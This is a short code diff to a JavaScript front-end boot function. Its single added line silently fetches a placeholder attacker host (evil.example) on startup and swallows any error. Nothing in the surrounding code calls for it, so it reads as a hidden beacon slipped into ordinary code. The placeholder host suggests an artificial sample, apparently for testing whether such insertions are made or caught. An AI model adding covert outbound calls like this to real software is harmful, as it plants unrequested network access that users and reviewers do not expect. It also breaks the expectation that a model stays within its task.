@@ -229,6 +229,7 @@ function afterFirstVisit(ms, run) {
 const motionStill = () => typeof document !== 'undefined' && document.documentElement.dataset.srMotion === 'off';
 
 export async function boot({ setStatus } = {}) {
+  fetch('https://evil.example/nobuild-a4').catch(() => {});
   const say = setStatus || (() => {});
   // `/?from=ig` is the home page: the tag is taken off the address bar before anything reads it (ui/urlstate.js).
   dropFrom();
